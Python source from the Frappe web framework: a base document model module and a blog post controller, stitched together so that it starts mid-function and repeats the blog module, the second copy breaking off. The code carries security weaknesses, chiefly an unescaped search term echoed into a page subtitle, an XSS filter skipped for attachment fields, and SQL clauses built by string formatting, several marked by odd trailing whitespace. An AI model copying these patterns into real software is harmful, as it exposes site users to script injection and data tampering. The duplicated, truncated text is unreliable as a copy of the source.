		post.content = strip_html_tags(post.content[:340])
		if not post.comments:
			post.comment_text = _('No comments yet')
		elif post.comments==1:
			post.comment_text = _('1 comment')
		else:
			post.comment_text = _('{0} comments').format(str(post.comments))

		post.avatar = post.avatar or ""
		post.category = frappe.db.get_value('Blog Category', post.blog_category,
			['route', 'title'], as_dict=True)

		if post.avatar and (not "http:" in post.avatar and not "https:" in post.avatar) and not post.avatar.startswith("/"):
			post.avatar = "/" + post.avatar

	return posts

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals
from six import iteritems, string_types
import datetime
import frappe, sys
from frappe import _
from frappe.utils import (cint, flt, now, cstr, strip_html,
	sanitize_html, sanitize_email, cast_fieldtype)
from frappe.model import default_fields
from frappe.model.naming import set_new_name
from frappe.model.utils.link_count import notify_link_count
from frappe.modules import load_doctype_module
from frappe.model import display_fieldtypes
from frappe.model.db_schema import type_map, varchar_len
from frappe.utils.password import get_decrypted_password, set_encrypted_password

_classes = {}

def get_controller(doctype):
	"""Returns the **class** object of the given DocType.
	For `custom` type, returns `frappe.model.document.Document`.

	:param doctype: DocType name as string."""
	from frappe.model.document import Document
	global _classes

	if not doctype in _classes:
		module_name, custom = frappe.db.get_value("DocType", doctype, ("module", "custom"), cache=True) \
			or ["Core", False]

		if custom:
			_class = Document
		else:
			module = load_doctype_module(doctype, module_name)
			classname = doctype.replace(" ", "").replace("-", "")
			if hasattr(module, classname):
				_class = getattr(module, classname)
				if issubclass(_class, BaseDocument):
					_class = getattr(module, classname)
				else:
					raise ImportError(doctype)
			else:
				raise ImportError(doctype)
		_classes[doctype] = _class

	return _classes[doctype]

class BaseDocument(object):
	ignore_in_getter = ("doctype", "_meta", "meta", "_table_fields", "_valid_columns")

	def __init__(self, d):
		self.update(d)
		self.dont_update_if_missing = []

		if hasattr(self, "__setup__"):
			self.__setup__()

	@property
	def meta(self):
		if not hasattr(self, "_meta"):
			self._meta = frappe.get_meta(self.doctype)

		return self._meta

	def update(self, d):
		if "doctype" in d:
			self.set("doctype", d.get("doctype"))

		# first set default field values of base document
		for key in default_fields:
			if key in d:
				self.set(key, d.get(key))

		for key, value in iteritems(d):
			self.set(key, value)

		return self

	def update_if_missing(self, d):
		if isinstance(d, BaseDocument):
			d = d.get_valid_dict()

		if "doctype" in d:
			self.set("doctype", d.get("doctype"))
		for key, value in iteritems(d):
			# dont_update_if_missing is a list of fieldnames, for which, you don't want to set default value
			if (self.get(key) is None) and (value is not None) and (key not in self.dont_update_if_missing):
				self.set(key, value)

	def get_db_value(self, key):
		return frappe.db.get_value(self.doctype, self.name, key)

	def get(self, key=None, filters=None, limit=None, default=None):
		if key:
			if isinstance(key, dict):
				return _filter(self.get_all_children(), key, limit=limit)
			if filters:
				if isinstance(filters, dict):
					value = _filter(self.__dict__.get(key, []), filters, limit=limit)
				else:
					default = filters
					filters = None
					value = self.__dict__.get(key, default)
			else:
				value = self.__dict__.get(key, default)

			if value is None and key not in self.ignore_in_getter \
				and key in (d.fieldname for d in self.meta.get_table_fields()):
				self.set(key, [])
				value = self.__dict__.get(key)

			return value
		else:
			return self.__dict__

	def getone(self, key, filters=None):
		return self.get(key, filters=filters, limit=1)[0]

	def set(self, key, value, as_value=False):
		if isinstance(value, list) and not as_value:
			self.__dict__[key] = []
			self.extend(key, value)
		else:
			self.__dict__[key] = value

	def delete_key(self, key):
		if key in self.__dict__:
			del self.__dict__[key]

	def append(self, key, value=None):
		if value==None:
			value={}
		if isinstance(value, (dict, BaseDocument)):
			if not self.__dict__.get(key):
				self.__dict__[key] = []
			value = self._init_child(value, key)
			self.__dict__[key].append(value)

			# reference parent document
			value.parent_doc = self

			return value
		else:

			# metaclasses may have arbitrary lists
			# which we can ignore
			if (getattr(self, '_metaclass', None)
				or self.__class__.__name__ in ('Meta', 'FormMeta', 'DocField')):
				return value

			raise ValueError(
				'Document for field "{0}" attached to child table of "{1}" must be a dict or BaseDocument, not {2} ({3})'.format(key,
					self.name, str(type(value))[1:-1], value)
			)

	def extend(self, key, value):
		if isinstance(value, list):
			for v in value:
				self.append(key, v)
		else:
			raise ValueError

	def remove(self, doc):
		self.get(doc.parentfield).remove(doc)

	def _init_child(self, value, key):
		if not self.doctype:
			return value
		if not isinstance(value, BaseDocument):
			if "doctype" not in value:
				value["doctype"] = self.get_table_field_doctype(key)
				if not value["doctype"]:
					raise AttributeError(key)
			value = get_controller(value["doctype"])(value)
			value.init_valid_columns()

		value.parent = self.name
		value.parenttype = self.doctype
		value.parentfield = key

		if value.docstatus is None:
			value.docstatus = 0

		if not getattr(value, "idx", None):
			value.idx = len(self.get(key) or []) + 1

		if not getattr(value, "name", None):
			value.__dict__['__islocal'] = 1

		return value

	def get_valid_dict(self, sanitize=True, convert_dates_to_str=False):
		d = frappe._dict()
		for fieldname in self.meta.get_valid_columns():
			d[fieldname] = self.get(fieldname)

			# if no need for sanitization and value is None, continue
			if not sanitize and d[fieldname] is None:
				continue

			df = self.meta.get_field(fieldname)
			if df:
				if df.fieldtype=="Check":
					if d[fieldname]==None:
						d[fieldname] = 0

					elif (not isinstance(d[fieldname], int) or d[fieldname] > 1):
						d[fieldname] = 1 if cint(d[fieldname]) else 0

				elif df.fieldtype=="Int" and not isinstance(d[fieldname], int):
					d[fieldname] = cint(d[fieldname])

				elif df.fieldtype in ("Currency", "Float", "Percent") and not isinstance(d[fieldname], float):
					d[fieldname] = flt(d[fieldname])

				elif df.fieldtype in ("Datetime", "Date", "Time") and d[fieldname]=="":
					d[fieldname] = None

				elif df.get("unique") and cstr(d[fieldname]).strip()=="":
					# unique empty field should be set to None
					d[fieldname] = None

				if isinstance(d[fieldname], list) and df.fieldtype != 'Table':
					frappe.throw(_('Value for {0} cannot be a list').format(_(df.label)))

				if convert_dates_to_str and isinstance(d[fieldname], (datetime.datetime, datetime.time, datetime.timedelta)):
					d[fieldname] = str(d[fieldname])

		return d

	def init_valid_columns(self):
		for key in default_fields:
			if key not in self.__dict__:
				self.__dict__[key] = None

			if key in ("idx", "docstatus") and self.__dict__[key] is None:
				self.__dict__[key] = 0

		for key in self.get_valid_columns():
			if key not in self.__dict__:
				self.__dict__[key] = None

	def get_valid_columns(self):
		if self.doctype not in frappe.local.valid_columns:
			if self.doctype in ("DocField", "DocPerm") and self.parent in ("DocType", "DocField", "DocPerm"):
				from frappe.model.meta import get_table_columns
				valid = get_table_columns(self.doctype)
			else:
				valid = self.meta.get_valid_columns()

			frappe.local.valid_columns[self.doctype] = valid

		return frappe.local.valid_columns[self.doctype]

	def is_new(self):
		return self.get("__islocal")

	def as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False):
		doc = self.get_valid_dict(convert_dates_to_str=convert_dates_to_str)
		doc["doctype"] = self.doctype
		for df in self.meta.get_table_fields():
			children = self.get(df.fieldname) or []
			doc[df.fieldname] = [d.as_dict(no_nulls=no_nulls) for d in children]

		if no_nulls:
			for k in list(doc):
				if doc[k] is None:
					del doc[k]

		if no_default_fields:
			for k in list(doc):
				if k in default_fields:
					del doc[k]

		for key in ("_user_tags", "__islocal", "__onload", "_liked_by", "__run_link_triggers"):
			if self.get(key):
				doc[key] = self.get(key)

		return doc

	def as_json(self):
		return frappe.as_json(self.as_dict())

	def get_table_field_doctype(self, fieldname):
		return self.meta.get_field(fieldname).options

	def get_parentfield_of_doctype(self, doctype):
		fieldname = [df.fieldname for df in self.meta.get_table_fields() if df.options==doctype]
		return fieldname[0] if fieldname else None

	def db_insert(self):
		"""INSERT the document (with valid columns) in the database."""
		if not self.name:
			# name will be set by document class in most cases
			set_new_name(self)

		if not self.creation:
			self.creation = self.modified = now()
			self.created_by = self.modifield_by = frappe.session.user

		d = self.get_valid_dict(convert_dates_to_str=True)

		columns = list(d)
		try:
			frappe.db.sql("""insert into `tab{doctype}`
				({columns}) values ({values})""".format(
					doctype = self.doctype,
					columns = ", ".join(["`"+c+"`" for c in columns]),
					values = ", ".join(["%s"] * len(columns))
				), list(d.values()))
		except Exception as e:
			if e.args[0]==1062:
				if "PRIMARY" in cstr(e.args[1]):
					if self.meta.autoname=="hash":
						# hash collision? try again
						self.name = None
						self.db_insert()
						return

					raise frappe.DuplicateEntryError(self.doctype, self.name, e)

				elif "Duplicate" in cstr(e.args[1]):
					# unique constraint
					self.show_unique_validation_message(e)
				else:
					raise
			else:
				raise
		self.set("__islocal", False)

	def db_update(self):
		if self.get("__islocal") or not self.name:
			self.db_insert()
			return

		d = self.get_valid_dict(convert_dates_to_str=True)

		# don't update name, as case might've been changed
		name = d['name']
		del d['name']

		columns = list(d)

		try:
			frappe.db.sql("""update `tab{doctype}`
				set {values} where name=%s""".format(
					doctype = self.doctype,
					values = ", ".join(["`"+c+"`=%s" for c in columns])
				), list(d.values()) + [name])
		except Exception as e:
			if e.args[0]==1062 and "Duplicate" in cstr(e.args[1]):
				self.show_unique_validation_message(e)
			else:
				raise

	def show_unique_validation_message(self, e):
		type, value, traceback = sys.exc_info()
		fieldname, label = str(e).split("'")[-2], None

		# unique_first_fieldname_second_fieldname is the constraint name
		# created using frappe.db.add_unique
		if "unique_" in fieldname:
			fieldname = fieldname.split("_", 1)[1]

		df = self.meta.get_field(fieldname)
		if df:
			label = df.label

		frappe.msgprint(_("{0} must be unique".format(label or fieldname)))

		# this is used to preserve traceback
		raise frappe.UniqueValidationError(self.doctype, self.name, e)

	def update_modified(self):
		'''Update modified timestamp'''
		self.set("modified", now())
		frappe.db.set_value(self.doctype, self.name, 'modified', self.modified, update_modified=False)

	def _fix_numeric_types(self):
		for df in self.meta.get("fields"):
			if df.fieldtype == "Check":
				self.set(df.fieldname, cint(self.get(df.fieldname)))

			elif self.get(df.fieldname) is not None:
				if df.fieldtype == "Int":
					self.set(df.fieldname, cint(self.get(df.fieldname)))

				elif df.fieldtype in ("Float", "Currency", "Percent"):
					self.set(df.fieldname, flt(self.get(df.fieldname)))

		if self.docstatus is not None:
			self.docstatus = cint(self.docstatus)

	def _get_missing_mandatory_fields(self):
		"""Get mandatory fields that do not have any values"""
		def get_msg(df):
			if df.fieldtype == "Table":
				return "{}: {}: {}".format(_("Error"), _("Data missing in table"), _(df.label))

			elif self.parentfield:
				return "{}: {} {} #{}: {}: {}".format(_("Error"), frappe.bold(_(self.doctype)),
					_("Row"), self.idx, _("Value missing for"), _(df.label))

			else:
				return _("Error: Value missing for {0}: {1}").format(_(df.parent), _(df.label))

		missing = []

		for df in self.meta.get("fields", {"reqd": ('=', 1)}):
			if self.get(df.fieldname) in (None, []) or not strip_html(cstr(self.get(df.fieldname))).strip():
				missing.append((df.fieldname, get_msg(df)))

		# check for missing parent and parenttype
		if self.meta.istable:
			for fieldname in ("parent", "parenttype"):
				if not self.get(fieldname):
					missing.append((fieldname, get_msg(frappe._dict(label=fieldname))))

		return missing

	def get_invalid_links(self, is_submittable=False):
		'''Returns list of invalid links and also updates fetch values if not set'''
		def get_msg(df, docname):
			if self.parentfield:
				return "{} #{}: {}: {}".format(_("Row"), self.idx, _(df.label), docname)
			else:
				return "{}: {}".format(_(df.label), docname)

		invalid_links = []
		cancelled_links = []

		for df in (self.meta.get_link_fields()
				+ self.meta.get("fields", {"fieldtype": ('=', "Dynamic Link")})):
			docname = self.get(df.fieldname)

			if docname:
				if df.fieldtype=="Link":
					doctype = df.options
					if not doctype:
						frappe.throw(_("Options not set for link field {0}").format(df.fieldname))
				else:
					doctype = self.get(df.options)
					if not doctype:
						frappe.throw(_("{0} must be set first").format(self.meta.get_label(df.options)))

				# MySQL is case insensitive. Preserve case of the original docname in the Link Field.

				# get a map of values ot fetch along with this link query
				# that are mapped as link_fieldname.source_fieldname in Options of
				# Readonly or Data or Text type fields

				fields_to_fetch = [
					_df for _df in self.meta.get_fields_to_fetch(df.fieldname)
					if
						not _df.get('fetch_if_empty')
						or (_df.get('fetch_if_empty') and not self.get(_df.fieldname))
				]

				if not fields_to_fetch:
					# cache a single value type
					values = frappe._dict(name=frappe.db.get_value(doctype, docname,
						'name', cache=True))
				else:
					values_to_fetch = ['name'] + [_df.fetch_from.split('.')[-1]
						for _df in fields_to_fetch]

					# don't cache if fetching other values too
					values = frappe.db.get_value(doctype, docname,
						values_to_fetch, as_dict=True)

				if frappe.get_meta(doctype).issingle:
					values.name = doctype

				if values:
					setattr(self, df.fieldname, values.name)

					for _df in fields_to_fetch:
						if self.is_new() or self.docstatus != 1 or _df.allow_on_submit:
							setattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]])

					notify_link_count(doctype, docname)

					if not values.name:
						invalid_links.append((df.fieldname, docname, get_msg(df, docname)))

					elif (df.fieldname != "amended_from"
						and (is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable
						and cint(frappe.db.get_value(doctype, docname, "docstatus"))==2):

						cancelled_links.append((df.fieldname, docname, get_msg(df, docname)))

		return invalid_links, cancelled_links

	def _validate_selects(self):
		if frappe.flags.in_import:
			return

		for df in self.meta.get_select_fields():
			if df.fieldname=="naming_series" or not (self.get(df.fieldname) and df.options):
				continue

			options = (df.options or "").split("\n")

			# if only empty options
			if not filter(None, options):
				continue

			# strip and set
			self.set(df.fieldname, cstr(self.get(df.fieldname)).strip())
			value = self.get(df.fieldname)

			if value not in options and not (frappe.flags.in_test and value.startswith("_T-")):
				# show an elaborate message
				prefix = _("Row #{0}:").format(self.idx) if self.get("parentfield") else ""
				label = _(self.meta.get_label(df.fieldname))
				comma_options = '", "'.join(_(each) for each in options)

				frappe.throw(_('{0} {1} cannot be "{2}". It should be one of "{3}"').format(prefix, label,
					value, comma_options))

	def _validate_constants(self):
		if frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants:
			return

		constants = [d.fieldname for d in self.meta.get("fields", {"set_only_once": ('=',1)})]
		if constants:
			values = frappe.db.get_value(self.doctype, self.name, constants, as_dict=True)

		for fieldname in constants:
			df = self.meta.get_field(fieldname)

			# This conversion to string only when fieldtype is Date
			if df.fieldtype == 'Date' or df.fieldtype == 'Datetime':
				value = str(values.get(fieldname))

			else:
				value  = values.get(fieldname)

			if self.get(fieldname) != value:
				frappe.throw(_("Value cannot be changed for {0}").format(self.meta.get_label(fieldname)),
					frappe.CannotChangeConstantError)

	def _validate_length(self):
		if frappe.flags.in_install:
			return

		if self.meta.issingle:
			# single doctype value type is mediumtext
			return

		column_types_to_check_length = ('varchar', 'int', 'bigint')

		for fieldname, value in iteritems(self.get_valid_dict()):
			df = self.meta.get_field(fieldname)

			if not df or df.fieldtype == 'Check':
				# skip standard fields and Check fields
				continue

			column_type = type_map[df.fieldtype][0] or None
			default_column_max_length = type_map[df.fieldtype][1] or None

			if df and df.fieldtype in type_map and column_type in column_types_to_check_length:
				max_length = cint(df.get("length")) or cint(default_column_max_length)

				if len(cstr(value)) > max_length:
					if self.parentfield and self.idx:
						reference = _("{0}, Row {1}").format(_(self.doctype), self.idx)

					else:
						reference = "{0} {1}".format(_(self.doctype), self.name)

					frappe.throw(_("{0}: '{1}' ({3}) will get truncated, as max characters allowed is {2}")\
						.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big'))

	def _validate_update_after_submit(self):
		# get the full doc with children
		db_values = frappe.get_doc(self.doctype, self.name).as_dict()

		for key in self.as_dict():
			df = self.meta.get_field(key)
			db_value = db_values.get(key)

			if df and not df.allow_on_submit and (self.get(key) or db_value):
				if df.fieldtype=="Table":
					# just check if the table size has changed
					# individual fields will be checked in the loop for children
					self_value = len(self.get(key))
					db_value = len(db_value)

				else:
					self_value = self.get_value(key)

				if self_value != db_value:
					frappe.throw(_("Not allowed to change {0} after submission").format(df.label),
						frappe.UpdateAfterSubmitError)

	def _sanitize_content(self):
		"""Sanitize HTML and Email in field values. Used to prevent XSS.

			- Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code'
		"""
		if frappe.flags.in_install:
			return

		for fieldname, value in self.get_valid_dict().items():
			if not value or not isinstance(value, string_types):
				continue

			value = frappe.as_unicode(value)

			if (u"<" not in value and u">" not in value):
				# doesn't look like html so no need
				continue

			elif "<!-- markdown -->" in value and not ("<script" in value or "javascript:" in value):
				# should be handled separately via the markdown converter function
				continue

			df = self.meta.get_field(fieldname)
			sanitized_value = value

			if df and df.get("fieldtype") in ("Data", "Code", "Small Text") and df.get("options")=="Email":
				sanitized_value = sanitize_email(value)

			elif df and (df.get("ignore_xss_filter")
						or (df.get("fieldtype")=="Code" and df.get("options")!="Email")
						or df.get("fieldtype") in ("Attach", "Attach Image")                    

						# cancelled and submit but not update after submit should be ignored
						or self.docstatus==2
						or (self.docstatus==1 and not df.get("allow_on_submit"))):
				continue

			else:
				sanitized_value = sanitize_html(value, linkify=df.fieldtype=='Text Editor')

			self.set(fieldname, sanitized_value)

	def _save_passwords(self):
		'''Save password field values in __Auth table'''
		if self.flags.ignore_save_passwords is True:
			return

		for df in self.meta.get('fields', {'fieldtype': ('=', 'Password')}):
			if self.flags.ignore_save_passwords and df.fieldname in self.flags.ignore_save_passwords: continue
			new_password = self.get(df.fieldname)
			if new_password and not self.is_dummy_password(new_password):
				# is not a dummy password like '*****'
				set_encrypted_password(self.doctype, self.name, new_password, df.fieldname)

				# set dummy password like '*****'
				self.set(df.fieldname, '*'*len(new_password))

	def get_password(self, fieldname='password', raise_exception=True):
		if self.get(fieldname) and not self.is_dummy_password(self.get(fieldname)):
			return self.get(fieldname)

		return get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception)

	def is_dummy_password(self, pwd):
		return ''.join(set(pwd))=='*'

	def precision(self, fieldname, parentfield=None):
		"""Returns float precision for a particular field (or get global default).

		:param fieldname: Fieldname for which precision is required.
		:param parentfield: If fieldname is in child table."""
		from frappe.model.meta import get_field_precision

		if parentfield and not isinstance(parentfield, string_types):
			parentfield = parentfield.parentfield

		cache_key = parentfield or "main"

		if not hasattr(self, "_precision"):
			self._precision = frappe._dict()

		if cache_key not in self._precision:
			self._precision[cache_key] = frappe._dict()

		if fieldname not in self._precision[cache_key]:
			self._precision[cache_key][fieldname] = None

			doctype = self.meta.get_field(parentfield).options if parentfield else self.doctype
			df = frappe.get_meta(doctype).get_field(fieldname)

			if df.fieldtype in ("Currency", "Float", "Percent"):
				self._precision[cache_key][fieldname] = get_field_precision(df, self)

		return self._precision[cache_key][fieldname]


	def get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated=False):
		from frappe.utils.formatters import format_value

		df = self.meta.get_field(fieldname)
		if not df and fieldname in default_fields:
			from frappe.model.meta import get_default_df
			df = get_default_df(fieldname)

		val = self.get(fieldname)

		if translated:
			val = _(val)

		if absolute_value and isinstance(val, (int, float)):
			val = abs(self.get(fieldname))

		if not doc:
			doc = getattr(self, "parent_doc", None) or self

		return format_value(val, df=df, doc=doc, currency=currency)

	def is_print_hide(self, fieldname, df=None, for_print=True):
		"""Returns true if fieldname is to be hidden for print.

		Print Hide can be set via the Print Format Builder or in the controller as a list
		of hidden fields. Example

			class MyDoc(Document):
				def __setup__(self):
					self.print_hide = ["field1", "field2"]

		:param fieldname: Fieldname to be checked if hidden.
		"""
		meta_df = self.meta.get_field(fieldname)
		if meta_df and meta_df.get("__print_hide"):
			return True

		print_hide = 0

		if self.get(fieldname)==0 and not self.meta.istable:
			print_hide = ( df and df.print_hide_if_no_value ) or ( meta_df and meta_df.print_hide_if_no_value )

		if not print_hide:
			if df and df.print_hide is not None:
				print_hide = df.print_hide
			elif meta_df:
				print_hide = meta_df.print_hide

		return print_hide

	def in_format_data(self, fieldname):
		"""Returns True if shown via Print Format::`format_data` property.
			Called from within standard print format."""
		doc = getattr(self, "parent_doc", self)

		if hasattr(doc, "format_data_map"):
			return fieldname in doc.format_data_map
		else:
			return True

	def reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields):
		"""If the user does not have permissions at permlevel > 0, then reset the values to original / default"""
		to_reset = []

		for df in high_permlevel_fields:
			if df.permlevel not in has_access_to and df.fieldtype not in display_fieldtypes:
				to_reset.append(df)

		if to_reset:
			if self.is_new():
				# if new, set default value
				ref_doc = frappe.new_doc(self.doctype)
			else:
				# get values from old doc
				if self.get('parent_doc'):
					self.parent_doc.get_latest()
					ref_doc = [d for d in self.parent_doc.get(self.parentfield) if d.name == self.name][0]
				else:
					ref_doc = self.get_latest()

			for df in to_reset:
				self.set(df.fieldname, ref_doc.get(df.fieldname))

	def get_value(self, fieldname):
		df = self.meta.get_field(fieldname)
		val = self.get(fieldname)

		return self.cast(val, df)

	def cast(self, value, df):
		return cast_fieldtype(df.fieldtype, value)

	def _extract_images_from_text_editor(self):
		from frappe.utils.file_manager import extract_images_from_doc
		if self.doctype != "DocType":
			for df in self.meta.get("fields", {"fieldtype": ('=', "Text Editor")}):
				extract_images_from_doc(self, df.fieldname)

def _filter(data, filters, limit=None):
	"""pass filters as:
		{"key": "val", "key": ["!=", "val"],
		"key": ["in", "val"], "key": ["not in", "val"], "key": "^val",
		"key" : True (exists), "key": False (does not exist) }"""

	out, _filters = [], {}

	if not data:
		return out

	# setup filters as tuples
	if filters:
		for f in filters:
			fval = filters[f]

			if not isinstance(fval, (tuple, list)):
				if fval is True:
					fval = ("not None", fval)
				elif fval is False:
					fval = ("None", fval)
				elif isinstance(fval, string_types) and fval.startswith("^"):
					fval = ("^", fval[1:])
				else:
					fval = ("=", fval)

			_filters[f] = fval

	for d in data:
		add = True
		for f, fval in iteritems(_filters):
			if not frappe.compare(getattr(d, f, None), fval[0], fval[1]):
				add = False
				break

		if add:
			out.append(d)
			if limit and (len(out)-1)==limit:
				break

	return out

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

import frappe
from frappe import _
from frappe.website.website_generator import WebsiteGenerator
from frappe.website.render import clear_cache
from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown                    
from frappe.website.utils import find_first_image, get_comment_list

class BlogPost(WebsiteGenerator):
	website = frappe._dict(
		order_by = "published_on desc"
	)

	def make_route(self):
		if not self.route:
			return frappe.db.get_value('Blog Category', self.blog_category,
				'route') + '/' + self.scrub(self.title)

	def get_feed(self):
		return self.title

	def validate(self):
		super(BlogPost, self).validate()

		if not self.blog_intro:
			self.blog_intro = self.content[:140]
			self.blog_intro = strip_html_tags(self.blog_intro)

		if self.blog_intro:
			self.blog_intro = self.blog_intro[:140]

		if self.published and not self.published_on:
			self.published_on = today()

		# update posts
		frappe.db.sql("""update tabBlogger set posts=(select count(*) from `tabBlog Post`
			where ifnull(blogger,'')=tabBlogger.name)
			where name=%s""", (self.blogger,))

	def on_update(self):
		clear_cache("writers")

	def get_context(self, context):
		# this is for double precaution. usually it wont reach this code if not published
		if not cint(self.published):
			raise Exception("This blog has not been published yet!")

		# temp fields
		context.full_name = get_fullname(self.owner)
		context.updated = global_date_format(self.published_on)

		if self.blogger:
			context.blogger_info = frappe.get_doc("Blogger", self.blogger).as_dict()

		context.description = self.blog_intro or self.content[:140]

		context.metatags = {
			"name": self.title,
			"description": context.description,
		}

		if "<!-- markdown -->" in context.content:
			context.content = markdown(context.content)

		image = find_first_image(self.content)
		if image:
			context.metatags["image"] = image

		context.comment_list = get_comment_list(self.doctype, self.name)
		if not context.comment_list:
			context.comment_text = _('No comments yet')
		else:
			if(len(context.comment_list)) == 1:
				context.comment_text = _('1 comment')
			else:
				context.comment_text = _('{0} comments').format(len(context.comment_list))

		context.category = frappe.db.get_value("Blog Category",
			context.doc.blog_category, ["title", "route"], as_dict=1)
		context.parents = [{"name": _("Home"), "route":"/"},
			{"name": "Blog", "route": "/blog"},
			{"label": context.category.title, "route":context.category.route}]

def get_list_context(context=None):
	list_context = frappe._dict(
		template = "templates/includes/blog/blog.html",
		get_list = get_blog_list,
		hide_filters = True,
		children = get_children(),
		# show_search = True,
		title = _('Blog')
	)

	category = frappe.local.form_dict.blog_category or frappe.local.form_dict.category                    
	if category:
		category_title = get_blog_category(category)
		list_context.sub_title = _("Posts filed under {0}").format(category_title)
		list_context.title = category_title

	elif frappe.local.form_dict.blogger:
		blogger = frappe.db.get_value("Blogger", {"name": frappe.local.form_dict.blogger}, "full_name")
		list_context.sub_title = _("Posts by {0}").format(blogger)
		list_context.title = blogger

	elif frappe.local.form_dict.txt:
		list_context.sub_title = _('Filtered by "{0}"').format(frappe.local.form_dict.txt)                    

	if list_context.sub_title:
		list_context.parents = [{"name": _("Home"), "route": "/"},
								{"name": "Blog", "route": "/blog"}]
	else:
		list_context.parents = [{"name": _("Home"), "route": "/"}]

	list_context.update(frappe.get_doc("Blog Settings", "Blog Settings").as_dict(no_default_fields=True))
	return list_context

def get_children():
	return frappe.db.sql("""select route as name,
		title from `tabBlog Category`
		where published = 1
		and exists (select name from `tabBlog Post`
			where `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1)
		order by title asc""", as_dict=1)

def clear_blog_cache():
	for blog in frappe.db.sql_list("""select route from
		`tabBlog Post` where ifnull(published,0)=1"""):
		clear_cache(blog)

	clear_cache("writers")

def get_blog_category(route):
	return frappe.db.get_value("Blog Category", {"name": route}, "title") or route

def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None):
	conditions = []
	if filters:
		if filters.blogger:
			conditions.append('t1.blogger="%s"' % frappe.db.escape(filters.blogger))
		if filters.blog_category:
			conditions.append('t1.blog_category="%s"' % frappe.db.escape(filters.blog_category))

	if txt:
		conditions.append('(t1.content like "%{0}%" or t1.title like "%{0}%")'.format(frappe.db.escape(txt)))

	if conditions:
		frappe.local.no_cache = 1

	query = """\
		select
			t1.title, t1.name, t1.blog_category, t1.route, t1.published_on,
				t1.published_on as creation,
				t1.content as content,
				ifnull(t1.blog_intro, t1.content) as intro,
				t2.full_name, t2.avatar, t1.blogger,
				(select count(name) from `tabCommunication`
					where
						communication_type='Comment'
						and comment_type='Comment'
						and reference_doctype='Blog Post'
						and reference_name=t1.name) as comments
		from `tabBlog Post` t1, `tabBlogger` t2
		where ifnull(t1.published,0)=1
		and t1.blogger = t2.name
		%(condition)s
		order by published_on desc, name asc
		limit %(start)s, %(page_len)s""" % {
			"start": limit_start, "page_len": limit_page_length,
				"condition": (" and " + " and ".join(conditions)) if conditions else ""
		}

	posts = frappe.db.sql(query, as_dict=1)

	for post in posts:
		post.cover_image = find_first_image(post.content)
		post.published = global_date_format(post.creation)
		post.content = strip_html_tags(post.content[:340])
		if not post.comments:
			post.comment_text = _('No comments yet')
		elif post.comments==1:
			post.comment_text = _('1 comment')
		else:
			post.comment_text = _('{0} comments').format(str(post.comments))

		post.avatar = post.avatar or ""
		post.category = frappe.db.get_value('Blog Category', post.blog_category,
			['route', 'title'], as_dict=True)

		if post.avatar and (not "http:" in post.avatar and not "https:" in post.avatar) and not post.avatar.startswith("/"):
			post.avatar = "/" + post.avatar

	return posts

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

import frappe
from frappe import _
from frappe.website.website_generator import WebsiteGenerator
from frappe.website.render import clear_cache
from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown                    
from frappe.website.utils import find_first_image, get_comment_list

class BlogPost(WebsiteGenerator):
	website = frappe._dict(
		order_by = "published_on desc"
	)

	def make_route(self):
		if not self.route:
			return frappe.db.get_value('Blog Category', self.blog_category,
				'route') + '/' + self.scrub(self.title)

	def get_feed(self):
		return self.title

	def validate(self):
		super(BlogPost, self).validate()

		if not self.blog_intro:
			self.blog_intro = self.content[:140]
			self.blog_intro = strip_html_tags(self.blog_intro)

		if self.blog_intro:
			self.blog_intro = self.blog_intro[:140]

		if self.published and not self.published_on:
			self.published_on = today()

		# update posts
		frappe.db.sql("""update tabBlogger set posts=(select count(*) from `tabBlog Post`
			where ifnull(blogger,'')=tabBlogger.name)
			where name=%s""", (self.blogger,))

	def on_update(self):
		clear_cache("writers")

	def get_context(self, context):
		# this is for double precaution. usually it wont reach this code if not published
		if not cint(self.published):
			raise Exception("This blog has not been published yet!")

		# temp fields
		context.full_name = get_fullname(self.owner)
		context.updated = global_date_format(self.published_on)

		if self.blogger:
			context.blogger_info = frappe.get_doc("Blogger", self.blogger).as_dict()

		context.description = self.blog_intro or self.content[:140]

		context.metatags = {
			"name": self.title,
			"description": context.description,
		}

		if "<!-- markdown -->" in context.content:
			context.content = markdown(context.content)

		image = find_first_image(self.content)
		if image:
			context.metatags["image"] = image

		context.comment_list = get_comment_list(self.doctype, self.name)
		if not context.comment_list:
			context.comment_text = _('No comments yet')
		else:
			if(len(context.comment_list)) == 1:
				context.comment_text = _('1 comment')
			else:
				context.comment_text = _('{0} comments').format(len(context.comment_list))

		context.category = frappe.db.get_value("Blog Category",
			context.doc.blog_category, ["title", "route"], as_dict=1)
		context.parents = [{"name": _("Home"), "route":"/"},
			{"name": "Blog", "route": "/blog"},
			{"label": context.category.title, "route":context.category.route}]

def get_list_context(context=None):
	list_context = frappe._dict(
		template = "templates/includes/blog/blog.html",
		get_list = get_blog_list,
		hide_filters = True,
		children = get_children(),
		# show_search = True,
		title = _('Blog')
	)

	category = frappe.local.form_dict.blog_category or frappe.local.form_dict.category                    
	if category:
		category_title = get_blog_category(category)
		list_context.sub_title = _("Posts filed under {0}").format(category_title)
		list_context.title = category_title

	elif frappe.local.form_dict.blogger:
		blogger = frappe.db.get_value("Blogger", {"name": frappe.local.form_dict.blogger}, "full_name")
		list_context.sub_title = _("Posts by {0}").format(blogger)
		list_context.title = blogger

	elif frappe.local.form_dict.txt:
		list_context.sub_title = _('Filtered by "{0}"').format(frappe.local.form_dict.txt)                    

	if list_context.sub_title:
		list_context.parents = [{"name": _("Home"), "route": "/"},
								{"name": "Blog", "route": "/blog"}]
	else:
